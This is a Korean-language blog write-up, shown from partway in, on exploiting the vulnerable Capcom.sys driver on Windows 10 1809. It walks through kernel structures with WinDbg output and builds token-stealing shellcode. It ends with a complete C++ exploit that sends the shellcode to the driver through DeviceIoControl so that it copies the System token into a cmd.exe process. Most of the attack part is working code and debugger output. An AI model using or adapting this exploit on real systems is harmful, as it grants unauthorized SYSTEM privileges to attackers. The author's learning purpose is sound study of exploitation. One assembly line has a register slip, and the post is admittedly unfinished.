00000244`c9c40016 0000            add     byte ptr [rax],al
00000244`c9c40018 0000            add     byte ptr [rax],al
```

말한 것과 같이 `inBuffer`값으로 실행 흐름이 바뀐 것을 볼 수 있다.

그럼 이제 여기에 코드를 넣고 어떻게 되는지 확인해본다.

```c++
#include <stdio.h>
#include <Windows.h>

int main()
{
	const wchar_t* deviceName = L"\\\\.\\Htsysm72FB";

	const DWORD dwIoCtlCode = 0xAA013044;
	HANDLE driver = CreateFile(deviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	PBYTE inBuffer = (PBYTE)VirtualAlloc(0, 48, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	*(PULONG_PTR)inBuffer = (ULONG_PTR)(inBuffer + 8);
	
	if (driver == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "Unable to access device driver\n");
		system("pause");
	}

	else {
		fprintf(stdout, "Device Handle : %p\n", driver);
		PBYTE inBuffer = (PBYTE)VirtualAlloc(0, 48, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		DWORD bytesReturned = 0;
		DWORD ioctlOutput = 0;


		*(PULONG_PTR)inBuffer = (ULONG_PTR)(inBuffer + 8);
		*(PULONG_PTR)(inBuffer + 8) = 0xCCCCCCCCCCCCCCCC;

		ULONG_PTR target = (ULONG_PTR)(inBuffer + 8);

		if (DeviceIoControl(driver, dwIoCtlCode, &target, 8, &ioctlOutput, 4, &bytesReturned, NULL))
		{
			fprintf(stdout, "Call DeviceIoControl\n"); 
			system("pause");
		}
		else {
			fprintf(stderr, "Call DeviceIoControl Failed\n");
			system("pause");
		}
		CloseHandle(driver);
	}
}
```

코드가 실행되는 `inBuffer` 위치에 `int3(0xcc)` 를 잔뜩 꾸겨넣었다. 이제 디버거에서 실제 실행했을 때 코드가 잘 실행되는지 확인한다.

자 블루스크린은 이쁘게 켜졌고, 콜 스택을 확인해본다.

```
 # Child-SP          RetAddr           Call Site
00 fffffe81`a82bec38 fffff807`150a0da2 nt!DbgBreakPointWithStatus
01 fffffe81`a82bec40 fffff807`150a0527 nt!KiBugCheckDebugBreak+0x12
02 fffffe81`a82beca0 fffff807`14fc4157 nt!KeBugCheck2+0x957
03 fffffe81`a82bf3c0 fffff807`14fd58e9 nt!KeBugCheckEx+0x107
04 fffffe81`a82bf400 fffff807`14fd1cd4 nt!KiBugCheckDispatch+0x69
05 fffffe81`a82bf540 00000222`a10d0008 nt!KiPageFault+0x454
06 fffffe81`a82bf6d8 fffff807`140e0577 0x00000222`a10d0008
07 fffffe81`a82bf6e0 fffff807`140e0613 Capcom+0x577
```

`BugCheck` 함수가 호출되기 전을 보면 되는데, `0x222a10d0008` 위치에서 예외가 발생한 것으로 보인다. 해당 위치의 메모리를 본다.

```
2: kd> dq 0x00000222`a10d0008
00000222`a10d0008  cccccccc`cccccccc 00000000`00000000
00000222`a10d0018  00000000`00000000 00000000`00000000
00000222`a10d0028  00000000`00000000 00000000`00000000
00000222`a10d0038  00000000`00000000 00000000`00000000
00000222`a10d0048  00000000`00000000 00000000`00000000
00000222`a10d0058  00000000`00000000 00000000`00000000
00000222`a10d0068  00000000`00000000 00000000`00000000
00000222`a10d0078  00000000`00000000 00000000`00000000
2: kd> u 0x00000222`a10d0008
00000222`a10d0008 cc              int     3
00000222`a10d0009 cc              int     3
00000222`a10d000a cc              int     3
00000222`a10d000b cc              int     3
00000222`a10d000c cc              int     3
00000222`a10d000d cc              int     3
00000222`a10d000e cc              int     3
00000222`a10d000f cc              int     3
```

아름답게 코드가 저장되어 있으며 실행을 했다. 링0의 권한을 가지고 있는 이 취약한 드라이버를 이용하여 이제 무엇이든 될 수 있게 되었다.

## [+] Ready

### [-] Get Started

토큰을 훔치는 이유는 당연히 Windows에서 가장 높은 권한인 `System`의 권한을 획득하기 위함이다. 이걸로 무엇을 할 수 있을지는 너무 방대해서 상상조차 어렵다.
검색하고 찾아본 내용에서 링0 영역의 권한을 갖는데 많이 사용되는 기법이 토큰 탈취라고 한다.

`System` 프로세스의 토큰을 훔치는 것은 대통령의 얼굴 사진과 이름을 잘라내어 내 신분증에 붙여넣는 것과 같다는 문구가 인상적이다.

그러기 위해서 먼저 필요한 과정은 코드 실행이 가능한 취약점을 찾아야 하는 것이다. 해당 위치에서 토큰을 훔치는 코드를 작성하고 해당 권한으로 쉘을 실행하면 된다는 이야기다.

그러기 위해 알아야 하는 구조체는 다음과 같다.

1. `KPCR` 
2. `KPRCB`
3. `KTHREAD`
4. `KAPC` 
5. `EPROCESS`

POC에 사용한 OS 정보는 다음과 같다.

- Windows 10, 1809(OS Build 17763.805)

내 블로그  <a href="https://shhoya.github.io/2019/06/03/WindowsK.html#-kernel-processor-control-region">포스트</a> 에 `KPCR` 관련 내용이 약간있다. `SSDT` 공부를 하다가 적어놨는데 해당 내용에도 토큰 탈취에 사용되고 있다라는 이야기가 적혀있다. 여기서 상세하게 다루게 되니 재밌다.

여기서 중요 포인트는 `KPCR`은 프로세서의 정보를 가지고 있는 구조체인데,  이에 접근하기 위해서는 `gs:[0]`을 이용하기 때문에 접근이 편리하다.

 우선 `KPCR`에서부터 토큰을 찾아가는 과정을 본다.

#### 1. KPCR

```
0: kd> dt_KPCR
ntdll!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : Ptr64 _KGDTENTRY64
   +0x008 TssBase          : Ptr64 _KTSS64
   +0x010 UserRsp          : Uint8B
   +0x018 Self             : Ptr64 _KPCR
   +0x020 CurrentPrcb      : Ptr64 _KPRCB
   +0x028 LockArray        : Ptr64 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : Ptr64 Void
   +0x038 IdtBase          : Ptr64 _KIDTENTRY64
   +0x040 Unused           : [2] Uint8B
   +0x050 Irql             : UChar
   +0x051 SecondLevelCacheAssociativity : UChar
   +0x052 ObsoleteNumber   : UChar
   +0x053 Fill0            : UChar
   +0x054 Unused0          : [3] Uint4B
   +0x060 MajorVersion     : Uint2B
   +0x062 MinorVersion     : Uint2B
   +0x064 StallScaleFactor : Uint4B
   +0x068 Unused1          : [3] Ptr64 Void
   +0x080 KernelReserved   : [15] Uint4B
   +0x0bc SecondLevelCacheSize : Uint4B
   +0x0c0 HalReserved      : [16] Uint4B
   +0x100 Unused2          : Uint4B
   +0x108 KdVersionBlock   : Ptr64 Void
   +0x110 Unused3          : Ptr64 Void
   +0x118 PcrAlign1        : [24] Uint4B
   +0x180 Prcb             : _KPRCB
```

위와 같이 이루어져있으며 맨 마지막 +180h에 `KPRCB` 구조체가 존재한다.

#### 2. KPRCB

```
0: kd> dt_KPRCB
ntdll!_KPRCB
   +0x000 MxCsr            : Uint4B
   +0x004 LegacyNumber     : UChar
   +0x005 ReservedMustBeZero : UChar
   +0x006 InterruptRequest : UChar
   +0x007 IdleHalt         : UChar
   +0x008 CurrentThread    : Ptr64 _KTHREAD
   +0x010 NextThread       : Ptr64 _KTHREAD
   +0x018 IdleThread       : Ptr64 _KTHREAD
```

해당 구조체의 0x08 에는 `KTHREAD` 구조체가 존재한다. 여기까지 접근하기 위해 다음과 같은 방법을 사용할 수 있을 것이다. `gs:[0](KPCR)` + `0x180(KPRCB)` +  `0x8(KTHREAD)` 으로 접근이 가능할 것이다. 여기까지 한번 정말 그런지 확인해본다.

```
0: kd> dg gs
                                                    P Si Gr Pr Lo
Sel        Base              Limit          Type    l ze an es ng Flags
---- ----------------- ----------------- ---------- - -- -- -- -- --------
002B fffff807`5d430000 00000000`ffffffff Data RW Ac 3 Bg Pg P  Nl 00000cf3
```

`gs:[0]` 은 `fffff807'5d430000` 이다. 

```
0: kd> dt_KPCR fffff807`5d430000
ntdll!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : 0xfffff807`60e6efb0 _KGDTENTRY64
   +0x008 TssBase          : 0xfffff807`60e6d000 _KTSS64
   +0x010 UserRsp          : 0
   +0x018 Self             : 0xfffff807`5d430000 _KPCR
   +0x020 CurrentPrcb      : 0xfffff807`5d430180 _KPRCB
   +0x028 LockArray        : 0xfffff807`5d430870 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : 0x00000000`005d1000 Void
   +0x038 IdtBase          : 0xfffff807`60e6c000 _KIDTENTRY64
   +0x040 Unused           : [2] 0
   +0x050 Irql             : 0 ''
   +0x051 SecondLevelCacheAssociativity : 0xc ''
   +0x052 ObsoleteNumber   : 0 ''
   +0x053 Fill0            : 0 ''
   +0x054 Unused0          : [3] 0
   +0x060 MajorVersion     : 1
   +0x062 MinorVersion     : 1
   +0x064 StallScaleFactor : 0x8a0
   +0x068 Unused1          : [3] (null) 
   +0x080 KernelReserved   : [15] 0
   +0x0bc SecondLevelCacheSize : 0x900000
   +0x0c0 HalReserved      : [16] 0x839b6800
   +0x100 Unused2          : 0
   +0x108 KdVersionBlock   : (null) 
   +0x110 Unused3          : (null) 
   +0x118 PcrAlign1        : [24] 0
   +0x180 Prcb             : _KPRCB
```

```
5: kd> dt_KPRCB fffff807`5d430000+180
ntdll!_KPRCB
   +0x000 MxCsr            : 0x1f80
   +0x004 LegacyNumber     : 0 ''
   +0x005 ReservedMustBeZero : 0 ''
   +0x006 InterruptRequest : 0 ''
   +0x007 IdleHalt         : 0x1 ''
   +0x008 CurrentThread    : 0xfffff807`5eb6b400 _KTHREAD
   +0x010 NextThread       : (null) 
   +0x018 IdleThread       : 0xfffff807`5eb6b400 _KTHREAD
   +0x020 NestingLevel     : 0 ''
   +0x021 ClockOwner       : 0x1 ''
   +0x022 PendingTickFlags : 0x1 ''
...
```

현재 스레드의 `KTHREAD` 구조체의 주소는 `fffff807'5eb6b400` 이다. 이 값은 메모리에서 확인하면 `gs:[188h]` 의 값임을 확인할 수 있다.

```
5: kd> dq fffff807`5d430000+180
fffff807`5d430180  01000000`00001f80 fffff807`5eb6b400
fffff807`5d430190  00000000`00000000 fffff807`5eb6b400
fffff807`5d4301a0  00000000`00010100 fffff807`60e79c10
fffff807`5d4301b0  00000000`00000000 fffff807`5d436910
fffff807`5d4301c0  000008a0`9e0a0106 00000000`00000000
```

그럼 위에서 말한 `gs:[188h]` 의 값이 현재 스레드의 `KTHREAD` 구조체임이 확인되었다.

#### 3. KTHREAD

중요한 `KTHREAD` 구간이 나왔다.

```
5: kd> dt_KTHREAD fffff807`5eb6b400
ntdll!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x791ddc0
   +0x028 InitialStack     : 0xfffff807`60e79c10 Void
   +0x030 StackLimit       : 0xfffff807`60e73000 Void
   +0x038 StackBase        : 0xfffff807`60e7a000 Void
   +0x040 ThreadLock       : 0
   +0x048 CycleTime        : 0x00000460`ffb4c06a
   +0x050 CurrentRunTime   : 0xffffffff
   +0x054 ExpectedRunTime  : 0
   +0x058 KernelStack      : 0xfffff807`60e79ba0 Void
   +0x060 StateSaveArea    : 0xfffff807`60e79c40 _XSAVE_FORMAT
   +0x068 SchedulingGroup  : (null) 
   +0x070 WaitRegister     : _KWAIT_STATUS_REGISTER
...
   +0x098 ApcState         : _KAPC_STATE
   +0x098 ApcStateFill     : [43]  "???"
...
   +0x21c QueuePriority    : 0n0
   +0x220 Process          : 0xfffff807`5eb689c0 _KPROCESS
...
```

큰 구조체를 지니고 있다. 중요한건 0x98 위치의 `KAPC_STATE` 구조체이다. 그리고 아래 0x220에 있는 `KPROCESS` 구조체를 보고 생각을 해봐야한다. 우리는 `System` 계정의 토큰을 탈취하려 한다. 그러기 위해 `EPROCESS` 구조체에 접근해야 한다.

나는 왜 저기 떡하니 프로세스 구조체가 있는데 `KAPC_STATE`를 봐야하는지 의아했다. 그래서 해당 프로세스 구조체를 확인해봤다.

```
5: kd> dt_EPROCESS 0xfffff807`5eb689c0
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : (null) 
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]
   +0x2f8 RundownProtect   : _EX_RUNDOWN_REF
   +0x300 Flags2           : 0x8000
...
   +0x450 ImageFileName    : [15]  "Idle"
```

바로 PID 0의 `Idle` 프로세스에 대한 구조체임을 확인할 수 있다. 우리가 탈취하려는 프로세스 토큰은 `System`이다.  찾아보면 `Idle` 프로세스를 찾는 내용의 글들도 있던데 한번 살펴봐야겠다 '왜' 찾는지...

어쨋든 그렇기 때문에 `KAPC_STATE`를 이용해야 한다.

#### 4. KAPC_STATE

```
0: kd> dt_KAPC_STATE
ntdll!_KAPC_STATE
   +0x000 ApcListHead      : [2] _LIST_ENTRY
   +0x020 Process          : Ptr64 _KPROCESS
   +0x028 InProgressFlags  : UChar
   +0x028 KernelApcInProgress : Pos 0, 1 Bit
   +0x028 SpecialApcInProgress : Pos 1, 1 Bit
   +0x029 KernelApcPending : UChar
   +0x02a UserApcPendingAll : UChar
   +0x02a SpecialUserApcPending : Pos 0, 1 Bit
   +0x02a UserApcPending   : Pos 1, 1 Bit
```

매우 간략한 정보를 가지고 있다. 여기서 중요한건 +0x20 위치에 `KPROCESS` 구조체이다.
`KAPC_STATE`는 `EPROCESS`와 관련되어 있으며 `KTHREAD`의 일부분이다라고 `geoff chappell` 에 정의되어 있다. 어렵다 어쨋든 위에서 얻은 정보를 토대로 접근하면 아래와 같다.

```
0: kd> dx -id 0,0,ffff920ea3a722c0 -r1 (*((ntdll!_KAPC_STATE *)0xfffff8075eb6b498))
(*((ntdll!_KAPC_STATE *)0xfffff8075eb6b498))                 [Type: _KAPC_STATE]
    [+0x000] ApcListHead      [Type: _LIST_ENTRY [2]]
    [+0x020] Process          : 0xffff920ea3a722c0 [Type: _KPROCESS *]
    [+0x028] InProgressFlags  : 0x0 [Type: unsigned char]
    [+0x028 ( 0: 0)] KernelApcInProgress : 0x0 [Type: unsigned char]
    [+0x028 ( 1: 1)] SpecialApcInProgress : 0x0 [Type: unsigned char]
    [+0x029] KernelApcPending : 0x0 [Type: unsigned char]
    [+0x02a] UserApcPendingAll : 0x0 [Type: unsigned char]
    [+0x02a ( 0: 0)] SpecialUserApcPending : 0x0 [Type: unsigned char]
    [+0x02a ( 1: 1)] UserApcPending   : 0x0 [Type: unsigned char]
```

#### 5. EPROCESS

프로세스 구조체는 `0xffff920ea3a722c0`에 위치한다. 이제 `EPROCESS` 구조체와 매핑하면 아래와 같이 `System` 프로세스임을 알 수 있다.

```
0: kd> dt_EPROCESS 0xffff920ea3a722c0 
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffff920e`a3a92368 - 0xfffff807`5ea1a560 ]
  ...
   +0x358 Token            : _EX_FAST_REF
  ...
   +0x450 ImageFileName    : [15]  "System"
```

위에 중요한 정보는 모두 존재한다. `System` 프로세스를 찾기 위한 `ActiveProcessLinks`와 `UniqueProcessId`는 8바이트 차이가 존재하고, 탈취하려는 토큰의 정보는 `EPROCESS`+0x358에 존재한다.

`Token`에 멤버의 `_EX_FAST_REF` 라는 설명이 중요하다. 이 값을 보면 `!process`로 확인한 토큰 값과 다르다는 것을 알 수 있다.

```
PROCESS ffff920ea3a722c0
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad002  ObjectTable: ffffdd0781209c40  HandleCount: 2666.
    Image: System
    VadRoot ffff920ea3a5d6a0 Vads 8 Clone 0 Private 21. Modified 26258. Locked 0.
    DeviceMap ffffdd07812134e0
    Token                             ffffdd078120b700
```

`!process` 명령으로 확인한 토큰 값은 `0xffffdd078120b700` 이다. 그러나 구조체를 따라가 확인하면 아래와 같은 값이 나온다.

```
0: kd> dt_EPROCESS -y Token 0xffff920ea3a722c0
ntdll!_EPROCESS
   +0x358 Token : _EX_FAST_REF
0: kd> dx -id 0,0,ffff920ea3a722c0 -r1 (*((ntdll!_EX_FAST_REF *)0xffff920ea3a72618))
(*((ntdll!_EX_FAST_REF *)0xffff920ea3a72618))                 [Type: _EX_FAST_REF]
    [+0x000] Object           : 0xffffdd078120b70f [Type: void *]
    [+0x000 ( 3: 0)] RefCnt           : 0xf [Type: unsigned __int64]
    [+0x000] Value            : 0xffffdd078120b70f [Type: unsigned __int64]
```

해당 내용을 확인하면 `0xffffdd078120b70f` 이 토큰 값으로 설정되어 있다. 정확히 어떤 계산인지는 모르지만 구하는 공식은 아래와 같다.

```
0: kd> ? poi(0xffff920ea3a722c0+358)&fffffffffffffff0
Evaluate expression: -38450675796224 = ffffdd07`8120b700
```

주소 값으로 예상되어 아래와 같이 토큰에 대한 구조체를 확인해봤다.

#### 6. Token

```
0: kd> dt_Token ffffdd07`8120b700
nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x06207526`b64ceb90
   +0x030 TokenLock        : 0xffff920e`a3aabc50 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : 0
   +0x07c UserAndGroupCount : 5
   +0x080 RestrictedSidCount : 0
   +0x084 VariableLength   : 0xa4
   +0x088 DynamicCharged   : 0x1000
  
0: kd> dx -id 0,0,ffff920ea3a722c0 -r1 (*((ntkrnlmp!_TOKEN_SOURCE *)0xffffdd078120b700))
(*((ntkrnlmp!_TOKEN_SOURCE *)0xffffdd078120b700))                 [Type: _TOKEN_SOURCE]
    [+0x000] SourceName       : "*SYSTEM*" [Type: char [8]]
    [+0x008] SourceIdentifier [Type: _LUID]

```

얼추 구조체가 맞는 듯 하다. `TOKEN_SOURCE` 구조체를 확인하면 `SourceName`에 `SYSTEM`으로 잘 들어가있는 것을 확인할 수 있다.

### [-] Get  Token

위에서 토큰에 접근하는 과정을 알아봤다. 그럼 실제로 어떻게 쉘 코드를 구성해야 할지 고민해봐야한다.

익스플로잇 순서는 다음과 같다고 한다.

1. `KTHREAD`와 `EPROCESS` 포인터 값 획득
2. `EPROCESS` 내 `ActiveProcessLinks(LIST_ENTRY)`를 따라 `UniqueProcessId` 가 `4(System)` 인 `EPROCESS` 구조체 포인터 획득
3. 토큰을 저장
4. `cmd.exe`에 대한 `EPROCESS` 구조체 포인터 획득
5. 해당 구조체의 `Token` 값을 `System` 토큰 값으로 Overwrite

#### 1. Get KTHREAD, EPROCESS pointer

`KPCR(gs:[0])` 을 기준으로 모두 가능한 행위다.
`KTHREAD` 는 확인한 바와 같이 `gs:[188h]` 위치에 존재한다. 

`KPCR + 0x180 = KPRCB`
`KPRCB + 0x8 = CurrentThread(KTHREAD)`

그리고 `EPROCESS` 를 찾아야 하는데, 이 때 `KAPC_STATE(KTHREAD+0x98)`를 이용한다고 했다. 이를 어셈블리로 표현하면 다음과 같이 표현할 수 있다.

```
MOV rcx, [gs:188h]	; Get KTHREAD pointer
MOV rdx, [rdx+B8h]	; Get EPROCESS pointer 
```

`KTHREAD` 값에 `+B8h`를 한 이유는 프로세스 구조체가 `KAPC_STATE`로 부터 0x20만큼 떨어진 위치에 존재하기 때문이다. 

#### 2. Get EPROCESS Pointer(System)

`EPROCESS` 구조체 내에 있는 `ActiveProcessLinks`를 이용하여 프로세스들을 탐색한다. 
`ActiveProcessLinks`는 이름대로 연결리스트로 구성되어 있는데, 이 때 `Flink`를 이용하여 프로세스를 탐색할 수 있다.

현재 `rdx` 레지스터에는 `EPROCESS`의 포인터가 담겨있다. 이를 이용하면 쉽게 원하는 프로세스의 구조체를 찾을 수 있다.

```
3: kd> dt_EPROCESS 0xffff970aaf260300
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffff970a`af310368 - 0xfffff803`1e8c1560 ]
```

우리가 필요한건 `UniqueProcessId`와 `ActiveProcessLinks`이다. 먼저 `ActiveProcessLinks`의 head를 가져오고, 이 값으로부터 -0x8의 위치에 있는 PID를 가져와 비교를 하면 된다. `System` 프로세스가 아닌 경우, `ActiveProcessLinks`의 `Flink`를 가져와 다음 프로세스와 비교하는 구문을 만들면 되는 것이다.

```
MOV r8, [rdx+2e8h]	; ActiveProcessLinks List Head
MOV rcx, [r8]	; First process in List

find_system:
	MOV rdx, [rcx-8]	; UniqueProcessId
	CMP rdx, 4	; if System Process
	JZ GetToken
	MOV rcx, [rcx]	; if not System Process, Next process List
	JMP find_system	; Loop
```

`ActiveProcessLinks`를 찾게 되면 이전에 찾은 `KTHREAD`, `EPROCESS` 포인터가 없어도 오프셋 놀이를 통해 모두 접근이 가능하기 때문에 `rcx`와 `rdx` 레지스터를 임시 레지스터로 사용했다. `LIST_ENTRY` 구조체에 대해서는 검색해보면 `DKOM` 기법 관련하여 많이 나오기도 하고, 직접 눈으로 보는걸 추천한다.

#### 3. Get "System" Process Token

`System` 프로세스를 찾았다면 이제 해당 권한의 토큰을 가져와야 한다. 프로세스 구조체를 찾았으니 쉽게 토큰 값을 저장할 수 있다.

먼저 계산을 해보자. 현재 `rcx`는 `System` 프로세스의 `EPROCESS` 구조체 중 `ActiveProcessLinks` 값을 갖고 있다. `Token` 멤버의 경우 `0x358` 위치에 존재하므로 `0x358 - 0x2e8`을 하게 되면 `rcx+70h` 으로 토큰 값을 가져올 수 있다.

```
GetToken:
	MOV rax, [rcx+70h]	; Move token
	AND al, 0f0h	; Clear low 4bits
```

위에서 얘기했던 연산부분이다. 결론적으로 마지막 4bit를 버리는 연산이었다. rax의 하위 4비트를 가져와 `f0`으로 AND연산하여 버리게 된다.

이렇게하면 정확한 프로세스의 토큰 값을 얻을 수 있으며, 이제 `RAX` 레지스터에 `System` 프로세스의 토큰 값이 저장되어 있다.

그 이후에는 `cmd` 나 내가 원하는 프로세스를 2번의 과정을 반복하여 찾고, 해당 토큰 값을 저장해주면 끝이다.
4,5번은 생략한다.

이를 쉘 코드를 작성하면 다음과 같이 볼 수 있다.

```
start:
	MOV rcx, [gs:188h]	; Get KTHREAD pointer
	MOV rdx, [rdx+B8h]	; Get EPROCESS pointer 
	MOV r8, [rdx+2e8h]	; ActiveProcessLinks List Head
	MOV rcx, [r8]	; First process in List

find_system:
	MOV rdx, [rcx-8]	; UniqueProcessId
	CMP rdx, 4	; if System Process
	JZ GetToken
	MOV rcx, [rcx]	; if not System Process, Next process List
	JMP find_system	; Loop
GetToken:
	MOV rax, [rcx+70h]   ;offset to token
	AND al, 0f0h         ;clear low 4 bits of _EX_FAST_REF structure
	
find_cmd:
    MOV rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
    CMP rdx, <PID>       ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
    JZ CopyToken         ;YES - move on
    MOV rcx, [rcx]       ;NO - next entry in list
    JMP find_cmd         ;loop
CopyToken:
    MOV [rcx+70h], rax   ;copy SYSTEM token over top of this process's token
return:
    add rsp, 28h         ;HEVD+0x61ea
    ret
```

위의 쉘 코드는 `HEVD` 라는 취약점 PoC를 위한 드라이버를 토대로 짜여진 쉘 코드다. 개념을 잡기 위한 내용일뿐이며 실제 익스플로잇에서는 다른 쉘 코드를 사용해야 한다.

## [+] Exploit

우선 내 머리로 짠 익스 코드다.

```c++
#include <stdio.h>
#include <Windows.h>

int main()
{

	BYTE ShellCode[] = { 
		0x51,
		0x52,
		0x41,0x50,
		0x41,0x51,
		0x65,0x48,0x8B,0x0C,0x25,0x88,0x01,0x00,0x00,
		0x48,0x8B,0x91,0xB8,0x00,0x00,0x00,
		0x4C,0x8B,0x82,0xE8,0x02,0x00,0x00,
		0x49,0x8B,0x08,
		0x48,0x8B,0x51,0xF8,
		0x48,0x83,0xFA,0x04,
		0x74,0x05,
		0x48,0x8B,0x09,
		0xEB,0xF1,
		0x48,0x8B,0x41,0x70,
		0x24,0xF0,
		0x48,0x8B,0x09,
		0x4C,0x8D,0x81,0x68,0x01,0x00,0x00,
		0x45,0x8A,0x08,
		0x41,0x80,0xF9,0x63,
		0x75,0xED,
		0x45,0x8A,0x48,0x01,
		0x41,0x80,0xF9,0x6D,
		0x75,0xE3,
		0x45,0x8A,0x48,0x02,
		0x41,0x80,0xF9,0x64,
		0x75,0xD9,
		0xEB,0x00,
		0x48,0x89,0x41,0x70,
		0x41,0x59,
		0x41,0x58,
		0x5A,
		0x59,
		0xC3 
	};
	/*
	push rcx
	push rdx
	push r8
	push r9
	mov rcx,qword ptr gs:[188]
	mov rdx,qword ptr ds:[rdx+B8]
	mov r8,qword ptr ds:[rdx+2E8]
	mov rcx,qword ptr ds:[r8]
	mov rdx,qword ptr ds:[rcx-8]
	cmp rdx,4
	je <capcomexp.GetToken>
	mov rcx,qword ptr ds:[rcx]
	jmp <capcomexp.FindProcess>
	mov rax,qword ptr ds:[rcx+70]
	and al,F0
	mov rcx,qword ptr ds:[rcx]
	lea r8,qword ptr ds:[rcx+168]
	mov r9b,byte ptr ds:[r8]
	cmp r9b,63
	jne <capcomexp.Find_Cmd>
	mov r9b,byte ptr ds:[r8+1]
	cmp r9b,6D
	jne <capcomexp.Find_Cmd>
	mov r9b,byte ptr ds:[r8+2]
	cmp r9b,64
	jne <capcomexp.Find_Cmd>
	jmp <capcomexp.CopyToken>
	mov qword ptr ds:[rcx+70],rax
	pop r9
	pop r8
	pop rdx
	pop rcx
	ret
*/
	const wchar_t* deviceName = L"\\\\.\\Htsysm72FB";

	const DWORD dwIoCtlCode = 0xAA013044;
	HANDLE driver = CreateFile(deviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (driver == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "Unable to access device driver\n");
		system("pause");
	}

	else {
		fprintf(stdout, "Device Handle : %p\n", driver);
		PBYTE inBuffer = (PBYTE)VirtualAlloc(0, 105, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		fprintf(stdout, "inBuffer : %p\n", inBuffer);
		DWORD bytesReturned = 0;
		DWORD ioctlOutput = 0;


		*(PULONG_PTR)inBuffer = (ULONG_PTR)(inBuffer + 8);
		fprintf(stdout, "inBuffer = %p %p\n", inBuffer, *inBuffer);
		memcpy(inBuffer + 8, ShellCode, 105);
		ULONG_PTR target = (ULONG_PTR)(inBuffer + 8);

		if (DeviceIoControl(driver, dwIoCtlCode, &target, 8, &ioctlOutput, 4, &bytesReturned, NULL))
		{
			fprintf(stdout, "Call DeviceIoControl\n"); 
			system("pause");
		}
		else {
			fprintf(stderr, "Call DeviceIoControl Failed\n");
			system("pause");
		}

		CloseHandle(driver);
	}
}
```

망나니 처럼 길다. 첫번째 나는 `InheritedFromUniqueProcessId`에 대한 존재를 몰랐다. 이는 부모의 PID를 의미하는 듯하다. 나는 콘솔 프로그램을 찾을 때, 아스키 문자를 통해 한글자씩 비교하여 토큰 값을 복사했다. 그러나 `InheritedFromUniqueProcessId`를 이용하면 그럴 필요가 없다.

디버깅을 해보면 처음 구하는 `EPROCESS` 구조체의 주인이 익스플로잇 프로그램이기 때문이다.

```
4: kd> dt_EPROCESS @rdx
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : 0x00000000`0000095c Void
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xfffff806`05228560 - 0xffff8d85`a4b1a368 ]
...
   +0x3e0 InheritedFromUniqueProcessId : 0x00000000`0000233c Void
...
   +0x450 ImageFileName    : [15]  "CapcomExp.exe"
```

여기서 `InheritedFromUniqueProcessId`를 저장하고 있다가 이후에 루프문을 통해 해당 값과 동일한 `UniqueProcessId`를 찾으면 그게 `CMD` 다.

계속 작성중...

## [+] Tip

`dg gs` 명령을 쳤을 때 Base가 0으로 나오는 경우가 존재한다. 중국어라 설명이 어렵고... 번역을 해보니 `gs`의 내용이 `MSR(Model-Specific Registers)` 로 이동되어 그런다고 한다. 그러니 `rdmsr 0xC0000101` 명령을 치면 `msr[c0000101]` 의 값이 나오고 이 값이 `gs:[0]` 인 `KPCR`의 주소 값이다.

